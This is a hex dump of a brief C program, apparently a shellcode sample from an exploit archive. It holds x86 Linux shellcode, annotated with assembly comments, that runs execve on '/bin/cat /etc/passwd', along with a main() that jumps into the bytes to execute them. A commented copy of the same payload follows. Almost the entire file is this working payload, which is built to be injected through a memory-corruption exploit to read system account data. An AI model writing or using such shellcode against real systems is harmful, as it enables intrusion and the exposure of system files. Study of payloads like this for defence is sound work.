00000000  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include <stdio.|
00000010  68 3e 0d 0a 20 0d 0a 63  6f 6e 73 74 20 63 68 61  |h>.. ..const cha|
00000020  72 20 73 68 65 6c 6c 63  6f 64 65 5b 5d 3d 22 5c  |r shellcode[]="\|
00000030  78 33 31 5c 78 63 30 22  20 2f 2f 20 78 6f 72 6c  |x31\xc0" // xorl|
00000040  20 25 65 61 78 2c 25 65  61 78 0d 0a 22 5c 78 39  | %eax,%eax.."\x9|
00000050  39 22 20 2f 2f 20 63 64  71 0d 0a 22 5c 78 35 32  |9" // cdq.."\x52|
00000060  22 20 2f 2f 20 70 75 73  68 20 65 64 78 0d 0a 22  |" // push edx.."|
00000070  5c 78 36 38 5c 78 32 66  5c 78 36 33 5c 78 36 31  |\x68\x2f\x63\x61|
00000080  5c 78 37 34 22 20 2f 2f  20 70 75 73 68 20 64 77  |\x74" // push dw|
00000090  6f 72 64 20 30 78 37 34  36 31 36 33 32 66 0d 0a  |ord 0x7461632f..|
000000a0  22 5c 78 36 38 5c 78 32  66 5c 78 36 32 5c 78 36  |"\x68\x2f\x62\x6|
000000b0  39 5c 78 36 65 22 20 2f  2f 20 70 75 73 68 20 64  |9\x6e" // push d|
000000c0  77 6f 72 64 20 30 78 36  65 36 39 36 32 32 66 0d  |word 0x6e69622f.|
000000d0  0a 22 5c 78 38 39 5c 78  65 33 22 20 2f 2f 20 6d  |."\x89\xe3" // m|
000000e0  6f 76 20 65 62 78 2c 65  73 70 0d 0a 22 5c 78 35  |ov ebx,esp.."\x5|
000000f0  32 22 20 2f 2f 20 70 75  73 68 20 65 64 78 0d 0a  |2" // push edx..|
00000100  22 5c 78 36 38 5c 78 37  33 5c 78 37 33 5c 78 37  |"\x68\x73\x73\x7|
00000110  37 5c 78 36 34 22 20 2f  2f 20 70 75 20 73 68 20  |7\x64" // pu sh |
00000120  64 77 6f 72 64 20 30 78  36 34 37 37 37 33 37 33  |dword 0x64777373|
00000130  0d 0a 22 5c 78 36 38 5c  78 32 66 5c 78 32 66 5c  |.."\x68\x2f\x2f\|
00000140  78 37 30 5c 78 36 31 22  20 2f 2f 20 70 75 73 68  |x70\x61" // push|
00000150  20 64 77 6f 72 64 20 30  78 36 31 37 30 32 66 32  | dword 0x61702f2|
00000160  66 0d 0a 22 5c 78 36 38  5c 78 32 66 5c 78 36 35  |f.."\x68\x2f\x65|
00000170  5c 78 37 34 5c 78 36 33  22 20 2f 2f 20 70 75 73  |\x74\x63" // pus|
00000180  68 20 64 77 6f 72 64 20  30 78 36 33 37 34 36 35  |h dword 0x637465|
00000190  32 66 0d 0a 22 5c 78 38  39 5c 78 65 31 22 20 2f  |2f.."\x89\xe1" /|
000001a0  2f 20 6d 6f 76 20 65 63  78 2c 65 73 70 0d 0a 22  |/ mov ecx,esp.."|
000001b0  5c 78 62 30 5c 78 30 62  22 20 2f 2f 20 6d 6f 76  |\xb0\x0b" // mov|
000001c0  20 24 30 78 62 2c 25 61  6c 0d 0a 22 5c 78 35 32  | $0xb,%al.."\x52|
000001d0  22 20 2f 2f 20 70 75 73  68 20 65 64 78 0d 0a 22  |" // push edx.."|
000001e0  5c 78 35 31 22 20 2f 2f  20 70 75 73 68 20 65 63  |\x51" // push ec|
000001f0  78 0d 0a 22 5c 78 35 33  22 20 2f 2f 20 70 75 73  |x.."\x53" // pus|
00000200  68 20 65 62 78 0d 0a 22  5c 78 38 39 5c 78 65 31  |h ebx.."\x89\xe1|
00000210  22 20 2f 2f 20 6d 6f 76  20 65 63 78 2c 65 73 70  |" // mov ecx,esp|
00000220  0d 0a 22 5c 78 63 64 5c  78 38 30 22 20 3b 20 2f  |.."\xcd\x80" ; /|
00000230  2f 20 69 6e 74 20 38 30  68 0d 0a 20 0d 0a 69 6e  |/ int 80h.. ..in|
00000240  74 20 6d 61 69 6e 28 29  0d 0a 7b 0d 0a 28 2a 28  |t main()..{..(*(|
00000250  76 6f 69 64 20 28 2a 29  28 29 29 20 73 68 65 6c  |void (*)()) shel|
00000260  6c 63 6f 64 65 29 28 29  3b 0d 0a 20 0d 0a 72 65  |lcode)();.. ..re|
00000270  74 75 72 6e 20 30 3b 0d  0a 7d 0d 0a 20 0d 0a 20  |turn 0;..}.. .. |
00000280  0d 0a 2f 2a 0d 0a 73 68  65 6c 6c 63 6f 64 65 5b  |../*..shellcode[|
00000290  5d 3d 09 22 5c 78 33 31  5c 78 63 30 5c 78 39 39  |]=."\x31\xc0\x99|
000002a0  5c 78 35 32 5c 78 36 38  5c 78 32 66 5c 78 36 33  |\x52\x68\x2f\x63|
000002b0  5c 78 36 31 5c 78 37 34  5c 78 36 38 5c 78 32 66  |\x61\x74\x68\x2f|
000002c0  5c 78 36 32 5c 78 36 39  5c 78 36 65 5c 78 38 39  |\x62\x69\x6e\x89|
000002d0  5c 78 65 33 5c 78 35 32  5c 78 36 38 5c 78 37 33  |\xe3\x52\x68\x73|
000002e0  5c 78 37 33 5c 78 37 37  5c 78 36 34 22 20 0a 09  |\x73\x77\x64" ..|
000002f0  09 22 5c 78 36 38 5c 78  32 66 5c 78 32 66 5c 78  |."\x68\x2f\x2f\x|
00000300  37 30 5c 78 36 31 5c 78  36 38 5c 78 32 66 5c 78  |70\x61\x68\x2f\x|
00000310  36 35 5c 78 37 34 5c 78  36 33 5c 78 38 39 5c 78  |65\x74\x63\x89\x|
00000320  65 31 5c 78 62 30 5c 78  30 62 5c 78 35 32 5c 78  |e1\xb0\x0b\x52\x|
00000330  35 31 5c 78 35 33 5c 78  38 39 5c 78 65 31 5c 78  |51\x53\x89\xe1\x|
00000340  63 64 5c 78 38 30 22 3b  0d 0a 2a 2f              |cd\x80";..*/|
0000034c
